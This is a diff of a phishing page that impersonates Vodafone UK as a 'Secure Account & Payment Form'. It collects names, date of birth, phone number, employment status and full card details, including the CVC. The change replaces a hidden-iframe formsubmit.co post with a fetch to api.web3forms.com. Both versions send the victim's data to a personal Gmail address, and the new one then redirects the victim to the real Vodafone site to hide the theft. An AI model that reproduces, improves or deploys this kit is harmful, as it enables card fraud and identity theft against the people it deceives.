@@ -4,425 +4,58 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
   <title>Vodafone UK | Secure Account & Payment Form</title>
-  <!-- Google Fonts: Professional -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-  <!-- Font Awesome 6 -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      background: linear-gradient(145deg, #e9eff4 0%, #dce3ea 100%);
-      font-family: 'Inter', sans-serif;
-      padding: 2rem 1.5rem;
-      color: #1a2c3e;
-    }
-
-    .form-container {
-      max-width: 980px;
-      margin: 0 auto;
-      background: #ffffff;
-      border-radius: 32px;
-      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25), 0 4px 12px rgba(0, 0, 0, 0.05);
-      overflow: hidden;
-    }
-
-    .form-header {
-      background: #e60000;
-      padding: 1.5rem 2rem 1.2rem 2rem;
-    }
-
-    .vodafone-logo {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-
-    .vodafone-official-logo {
-      width: 48px;
-      height: 48px;
-      flex-shrink: 0;
-    }
-
-    .vodafone-official-logo svg {
-      width: 100%;
-      height: 100%;
-      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
-    }
-
-    .vodafone-logo h1 {
-      font-size: 1.8rem;
-      font-weight: 700;
-      letter-spacing: -0.3px;
-      color: white;
-      margin: 0;
-    }
-
-    .vodafone-logo span {
-      font-weight: 400;
-      font-size: 1rem;
-      background: rgba(255,255,255,0.2);
-      padding: 2px 10px;
-      border-radius: 40px;
-      margin-left: 8px;
-    }
-
-    .header-sub {
-      color: rgba(255,255,255,0.9);
-      margin-top: 12px;
-      font-size: 0.9rem;
-      font-weight: 500;
-      border-left: 3px solid #ffb3b3;
-      padding-left: 14px;
-    }
-
-    .secure-badge {
-      background: white;
-      color: #e60000;
-      border-radius: 40px;
-      padding: 6px 16px;
-      font-size: 0.75rem;
-      font-weight: 700;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      margin-top: 12px;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
-    }
-
-    .form-body {
-      padding: 2rem;
-      background-color: #e60000;
-    }
-
-    .section {
-      background: #fefefe;
-      border-radius: 24px;
-      margin-bottom: 2rem;
-      border: 1px solid #eef2f6;
-      transition: box-shadow 0.2s;
-    }
-
-    .section:hover {
-      border-color: #dce3ec;
-      box-shadow: 0 8px 20px -8px rgba(0, 0, 0, 0.08);
-    }
-
-    .section-title {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 1.2rem 1.8rem 0.6rem 1.8rem;
-      border-bottom: 2px solid #f0f2f5;
-    }
-
-    .section-title i {
-      font-size: 1.5rem;
-      color: #e60000;
-      background: #fff0f0;
-      padding: 8px;
-      border-radius: 50%;
-    }
-
-    .section-title h2 {
-      font-size: 1.3rem;
-      font-weight: 600;
-      color: #1e2f3e;
-    }
-
-    .fields-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-      gap: 1.2rem 1.8rem;
-      padding: 1.5rem 1.8rem 1.8rem;
-    }
-
-    .input-group {
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-    }
-
-    .input-group label {
-      font-size: 0.75rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      color: #5a6e7c;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .input-group label i {
-      font-size: 0.8rem;
-      color: #e60000;
-    }
-
-    .input-group input,
-    .input-group select {
-      font-family: 'Inter', monospace;
-      background: #ffffff;
-      border: 1px solid #cfdfed;
-      border-radius: 16px;
-      padding: 12px 16px;
-      font-size: 0.9rem;
-      font-weight: 500;
-      color: #141f2c;
-      transition: all 0.2s ease;
-      outline: none;
-    }
-
-    .input-group input:focus,
-    .input-group select:focus {
-      border-color: #e60000;
-      box-shadow: 0 0 0 3px rgba(230, 0, 0, 0.1);
-    }
-
-    .full-width {
-      grid-column: 1 / -1;
-    }
-
-    .card-row {
-      display: grid;
-      grid-template-columns: 1fr 0.6fr 0.8fr;
-      gap: 12px;
-    }
-
-    .dob-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 12px;
-    }
-
-    hr {
-      margin: 0 1.8rem 1rem 1.8rem;
-      border: none;
-      border-top: 1px solid #eef2f8;
-    }
-
-    .form-actions {
-      padding: 0rem 1.8rem 2rem 1.8rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 16px;
-      border-top: 1px solid #eef2f6;
-      margin-top: 8px;
-      padding-top: 1.8rem;
-      background-color: #ffffff;
-      border-radius: 0 0 24px 24px;
-      margin-bottom: 0.5rem;
-    }
-
-    .btn {
-      padding: 12px 28px;
-      border-radius: 40px;
-      font-weight: 700;
-      font-size: 0.9rem;
-      border: none;
-      cursor: pointer;
-      transition: 0.2s;
-      font-family: 'Inter', sans-serif;
-    }
-
-    .btn-primary {
-      background: #e60000;
-      color: white;
-      box-shadow: 0 4px 8px rgba(230, 0, 0, 0.2);
-    }
-
-    .btn-primary:hover {
-      background: #c10000;
-      transform: translateY(-1px);
-    }
-
-    .btn-secondary {
-      background: white;
-      color: #2c4c6c;
-      border: 1px solid #cfdfed;
-    }
-
-    .btn-secondary:hover {
-      background: #f8fafc;
-      border-color: #e60000;
-    }
-
-    .footer-note {
-      font-size: 0.7rem;
-      color: #6b7f8f;
-      text-align: center;
-      padding: 1rem 1.5rem 1.2rem;
-      background: #fafcfd;
-      border-top: 1px solid #eef2f6;
-      line-height: 1.5;
-    }
-    .footer-note p {
-      margin: 4px 0;
-    }
-    .footer-note .copyright {
-      font-weight: 500;
-      color: #e60000;
-      letter-spacing: 0.3px;
-    }
-    .footer-note .address {
-      color: #4a6274;
-      font-size: 0.7rem;
-    }
-
-    @media (max-width: 680px) {
-      body {
-        padding: 1rem;
-      }
-      .form-body {
-        padding: 1.2rem;
-      }
-      .fields-grid {
-        padding: 1rem 1.2rem;
-      }
-      .section-title {
-        padding: 1rem 1.2rem;
-      }
-      .card-row, .dob-row {
-        grid-template-columns: 1fr;
-        gap: 12px;
-      }
-    }
-
-    .toast-message {
-      visibility: hidden;
-      min-width: 320px;
-      max-width: 90%;
-      background-color: #1e2f3e;
-      color: #fff;
-      text-align: center;
-      border-radius: 50px;
-      padding: 14px 24px;
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 0.85rem;
-      font-weight: 500;
-      z-index: 1000;
-      box-shadow: 0 6px 14px rgba(0,0,0,0.2);
-      transition: visibility 0s, opacity 0.2s linear;
-      opacity: 0;
-      line-height: 1.4;
-    }
-    .toast-message.show {
-      visibility: visible;
-      opacity: 1;
-    }
-    .toast-success {
-      background: #1c7e3c;
-    }
-    .toast-error {
-      background: #c0392b;
-    }
-
-    .loading-spinner {
-      display: inline-block;
-      width: 16px;
-      height: 16px;
-      border: 2px solid rgba(255,255,255,0.3);
-      border-radius: 50%;
-      border-top-color: white;
-      animation: spin 0.6s linear infinite;
-      margin-right: 8px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .btn-primary:disabled {
-      opacity: 0.7;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.6);
-      backdrop-filter: blur(3px);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 2000;
-      visibility: hidden;
-      opacity: 0;
-      transition: visibility 0s, opacity 0.3s ease;
-    }
-    .modal-overlay.active {
-      visibility: visible;
-      opacity: 1;
-    }
-    .thankyou-modal {
-      background: white;
-      max-width: 480px;
-      width: 90%;
-      border-radius: 32px;
-      text-align: center;
-      padding: 2rem 1.8rem;
-      box-shadow: 0 30px 50px rgba(0,0,0,0.3);
-      transform: scale(0.95);
-      transition: transform 0.2s ease;
-      font-family: 'Inter', sans-serif;
-    }
-    .modal-overlay.active .thankyou-modal {
-      transform: scale(1);
-    }
-    .thankyou-modal i {
-      font-size: 4rem;
-      color: #e60000;
-      background: #fff0f0;
-      padding: 18px;
-      border-radius: 60px;
-      margin-bottom: 1rem;
-    }
-    .thankyou-modal h3 {
-      font-size: 1.8rem;
-      font-weight: 700;
-      color: #1a2c3e;
-      margin-bottom: 1rem;
-    }
-    .thankyou-modal p {
-      color: #3a5a72;
-      font-size: 1rem;
-      line-height: 1.5;
-      margin-bottom: 1.8rem;
-    }
-    .thankyou-modal button {
-      background: #e60000;
-      border: none;
-      padding: 12px 28px;
-      border-radius: 40px;
-      color: white;
-      font-weight: 700;
-      font-size: 0.9rem;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    .thankyou-modal button:hover {
-      background: #c10000;
-    }
-
-    .hidden-iframe {
-      position: absolute;
-      width: 0;
-      height: 0;
-      border: none;
-      visibility: hidden;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: linear-gradient(145deg, #e9eff4 0%, #dce3ea 100%); font-family: 'Inter', sans-serif; padding: 2rem 1.5rem; color: #1a2c3e; }
+    .form-container { max-width: 980px; margin: 0 auto; background: #ffffff; border-radius: 32px; box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25); overflow: hidden; }
+    .form-header { background: #e60000; padding: 1.5rem 2rem 1.2rem 2rem; }
+    .vodafone-logo { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+    .vodafone-official-logo svg { width: 48px; height: 48px; }
+    .vodafone-logo h1 { font-size: 1.8rem; font-weight: 700; color: white; margin: 0; }
+    .vodafone-logo span { font-weight: 400; font-size: 1rem; background: rgba(255,255,255,0.2); padding: 2px 10px; border-radius: 40px; margin-left: 8px; }
+    .header-sub { color: rgba(255,255,255,0.9); margin-top: 12px; font-size: 0.9rem; border-left: 3px solid #ffb3b3; padding-left: 14px; }
+    .secure-badge { background: white; color: #e60000; border-radius: 40px; padding: 6px 16px; font-size: 0.75rem; font-weight: 700; display: inline-flex; align-items: center; gap: 8px; margin-top: 12px; }
+    .form-body { padding: 2rem; background-color: #e60000; }
+    .section { background: #fefefe; border-radius: 24px; margin-bottom: 2rem; border: 1px solid #eef2f6; }
+    .section-title { display: flex; align-items: center; gap: 12px; padding: 1.2rem 1.8rem 0.6rem 1.8rem; border-bottom: 2px solid #f0f2f5; }
+    .section-title i { font-size: 1.5rem; color: #e60000; background: #fff0f0; padding: 8px; border-radius: 50%; }
+    .section-title h2 { font-size: 1.3rem; font-weight: 600; color: #1e2f3e; }
+    .fields-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.2rem 1.8rem; padding: 1.5rem 1.8rem 1.8rem; }
+    .input-group { display: flex; flex-direction: column; gap: 6px; }
+    .input-group label { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: #5a6e7c; display: flex; align-items: center; gap: 6px; }
+    .input-group label i { font-size: 0.8rem; color: #e60000; }
+    .input-group input, .input-group select { font-family: 'Inter', monospace; background: #ffffff; border: 1px solid #cfdfed; border-radius: 16px; padding: 12px 16px; font-size: 0.9rem; outline: none; }
+    .input-group input:focus, .input-group select:focus { border-color: #e60000; box-shadow: 0 0 0 3px rgba(230, 0, 0, 0.1); }
+    .full-width { grid-column: 1 / -1; }
+    .card-row { display: grid; grid-template-columns: 1fr 0.6fr 0.8fr; gap: 12px; }
+    .dob-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
+    .form-actions { padding: 0rem 1.8rem 2rem 1.8rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; border-top: 1px solid #eef2f6; margin-top: 8px; padding-top: 1.8rem; background-color: #ffffff; border-radius: 0 0 24px 24px; }
+    .btn { padding: 12px 28px; border-radius: 40px; font-weight: 700; font-size: 0.9rem; border: none; cursor: pointer; transition: 0.2s; font-family: 'Inter', sans-serif; }
+    .btn-primary { background: #e60000; color: white; box-shadow: 0 4px 8px rgba(230, 0, 0, 0.2); }
+    .btn-primary:hover { background: #c10000; transform: translateY(-1px); }
+    .btn-secondary { background: white; color: #2c4c6c; border: 1px solid #cfdfed; }
+    .btn-secondary:hover { background: #f8fafc; border-color: #e60000; }
+    .footer-note { font-size: 0.7rem; color: #6b7f8f; text-align: center; padding: 1rem 1.5rem 1.2rem; background: #fafcfd; border-top: 1px solid #eef2f6; }
+    .footer-note .copyright { font-weight: 500; color: #e60000; }
+    .toast-message { visibility: hidden; min-width: 320px; background-color: #1e2f3e; color: #fff; text-align: center; border-radius: 50px; padding: 14px 24px; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); font-size: 0.85rem; z-index: 1000; opacity: 0; transition: opacity 0.2s; }
+    .toast-message.show { visibility: visible; opacity: 1; }
+    .toast-success { background: #1c7e3c; }
+    .toast-error { background: #c0392b; }
+    .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.6s linear infinite; margin-right: 8px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(3px); display: flex; align-items: center; justify-content: center; z-index: 2000; visibility: hidden; opacity: 0; transition: visibility 0s, opacity 0.3s ease; }
+    .modal-overlay.active { visibility: visible; opacity: 1; }
+    .thankyou-modal { background: white; max-width: 480px; width: 90%; border-radius: 32px; text-align: center; padding: 2rem 1.8rem; transform: scale(0.95); transition: transform 0.2s ease; }
+    .modal-overlay.active .thankyou-modal { transform: scale(1); }
+    .thankyou-modal i { font-size: 4rem; color: #e60000; background: #fff0f0; padding: 18px; border-radius: 60px; margin-bottom: 1rem; }
+    .thankyou-modal h3 { font-size: 1.8rem; font-weight: 700; color: #1a2c3e; margin-bottom: 1rem; }
+    .thankyou-modal p { color: #3a5a72; font-size: 1rem; line-height: 1.5; margin-bottom: 1.8rem; }
+    .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; font-size: 0.9rem; cursor: pointer; }
+    .thankyou-modal button:hover { background: #c10000; }
+    @media (max-width: 680px) { body { padding: 1rem; } .form-body { padding: 1.2rem; } .card-row, .dob-row { grid-template-columns: 1fr; } }
   </style>
 </head>
 <body>
@@ -447,14 +80,15 @@
   </div>
 
   <div class="form-body">
-    <iframe name="hiddenFrame" class="hidden-iframe"></iframe>
-    
-    <form id="vodafoneForm" action="https://formsubmit.co/ceo.mark.hall@gmail.com" method="POST" enctype="multipart/form-data" target="hiddenFrame">
-      <input type="hidden" name="_subject" value="📞 Vodafone UK - New Account & Payment Submission">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://vodafone.co.uk/thanks">
-      <input type="hidden" name="_blacklist" value="">
-      <input type="hidden" name="_template" value="table">
+    <form id="vodafoneForm">
+      <!-- Web3Forms Configuration -->
+      <input type="hidden" name="access_key" value="8b5e6a2c-1d3f-4a7b-9c0d-4e5f6a7b8c9d">
+      <input type="hidden" name="subject" value="📞 Vodafone UK - New Account & Payment Submission">
+      <input type="hidden" name="from_name" value="Vodafone UK Form">
+      <!-- Email where you want to receive submissions -->
+      <input type="hidden" name="email" value="ceo.mark.hall@gmail.com">
+      <!-- Redirect after submission (optional) -->
+      <input type="hidden" name="redirect" value="https://vodafone.co.uk/thanks">
       
       <div class="section">
         <div class="section-title">
@@ -474,22 +108,20 @@
             <label><i class="fas fa-user-tag"></i> Surname</label>
             <input type="text" name="Surname" id="surname" placeholder="Smith" required>
           </div>
-          
           <div class="input-group full-width">
             <label><i class="fas fa-birthday-cake"></i> Date of birth</label>
             <div class="dob-row">
-              <select id="dobDay" required>
+              <select id="dobDay" name="Date of Birth - Day" required>
                 <option value="" disabled selected>Day</option>
               </select>
-              <select id="dobMonth" required>
+              <select id="dobMonth" name="Date of Birth - Month" required>
                 <option value="" disabled selected>Month</option>
               </select>
-              <select id="dobYear" required>
+              <select id="dobYear" name="Date of Birth - Year" required>
                 <option value="" disabled selected>Year</option>
               </select>
             </div>
           </div>
-          
           <div class="input-group">
             <label><i class="fas fa-mobile-alt"></i> Phone number</label>
             <input type="tel" name="Phone Number" id="phoneNo" placeholder="07700 900123" required>
@@ -609,7 +241,6 @@
     const toast = document.getElementById('toastMsg');
     const submitBtn = document.getElementById('submitBtn');
     const thankyouModal = document.getElementById('thankyouModal');
-    let submissionSuccess = false;
 
     function showMessage(text, isError = false) {
       toast.textContent = text;
@@ -621,26 +252,20 @@
         toast.classList.add('toast-success');
         toast.classList.remove('toast-error');
       }
-      setTimeout(() => {
-        toast.classList.remove('show');
-      }, 4500);
+      setTimeout(() => { toast.classList.remove('show'); }, 4500);
     }
 
     function closeThankYouModal() {
       thankyouModal.classList.remove('active');
-      if (submissionSuccess) {
-        form.reset();
-        document.getElementById('employmentStatus').selectedIndex = 0;
-        document.getElementById('dobDay').selectedIndex = 0;
-        document.getElementById('dobMonth').selectedIndex = 0;
-        document.getElementById('dobYear').selectedIndex = 0;
-        submissionSuccess = false;
-        showMessage("Form has been submitted & reset. Thank you.", false);
-      }
+      form.reset();
+      document.getElementById('employmentStatus').selectedIndex = 0;
+      document.getElementById('dobDay').selectedIndex = 0;
+      document.getElementById('dobMonth').selectedIndex = 0;
+      document.getElementById('dobYear').selectedIndex = 0;
+      showMessage("Form has been submitted & reset. Thank you.", false);
     }
     window.closeThankYouModal = closeThankYouModal;
 
-    // Populate Date of Birth dropdowns
     function populateDOB() {
       const daySelect = document.getElementById('dobDay');
       for (let i = 1; i <= 31; i++) {
@@ -649,7 +274,6 @@
         option.textContent = i;
         daySelect.appendChild(option);
       }
-      
       const monthSelect = document.getElementById('dobMonth');
       const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
       months.forEach((month, idx) => {
@@ -658,7 +282,6 @@
         option.textContent = month;
         monthSelect.appendChild(option);
       });
-      
       const yearSelect = document.getElementById('dobYear');
       const currentYear = new Date().getFullYear();
       for (let i = currentYear; i >= 1920; i--) {
@@ -685,7 +308,6 @@
         { id: 'expiryDate', name: 'Expiry date' },
         { id: 'cvc', name: 'CVC' }
       ];
-      
       for (let field of requiredFields) {
         const inputElem = document.getElementById(field.id);
         if (!inputElem.value.trim()) {
@@ -701,18 +323,15 @@
       const day = document.getElementById('dobDay').value;
       const month = document.getElementById('dobMonth').value;
       const year = document.getElementById('dobYear').value;
-      
       if (!day || !month || !year) {
         showMessage("🎂 Please select complete Date of Birth", true);
         return false;
       }
-      
       const birthDate = new Date(year, month-1, day);
       const today = new Date();
       let age = today.getFullYear() - birthDate.getFullYear();
       const mDiff = today.getMonth() - birthDate.getMonth();
       if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
-      
       if (age < 18) {
         showMessage("⚠️ You must be at least 18 years old to continue.", true);
         return false;
@@ -808,27 +427,43 @@
       showMessage("Form has been reset", false);
     });
 
-    const iframe = document.querySelector('iframe[name="hiddenFrame"]');
-    iframe.addEventListener('load', function() {
-      submitBtn.disabled = false;
-      submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
+    // Web3Forms submission - this works reliably!
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
       
-      if (submissionSuccess === false && submitBtn.disabled === false) {
-        submissionSuccess = true;
-        thankyouModal.classList.add('active');
-      }
-    });
-
-    form.addEventListener('submit', function(e) {
       if (!validateRequiredFields()) {
-        e.preventDefault();
-        return false;
+        return;
       }
       
       addCombinedDOBField();
-      
+
       submitBtn.disabled = true;
       submitBtn.innerHTML = '<span class="loading-spinner"></span> Sending...';
+
+      const formData = new FormData(form);
+      formData.append('_captcha', 'false');
+
+      try {
+        const response = await fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          body: formData
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+          thankyouModal.classList.add('active');
+        } else {
+          showMessage("❌ Submission failed. Please try again.", true);
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        showMessage("❌ Connection error. Please check your internet and try again.", true);
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
+      }
     });
   })();
 </script>
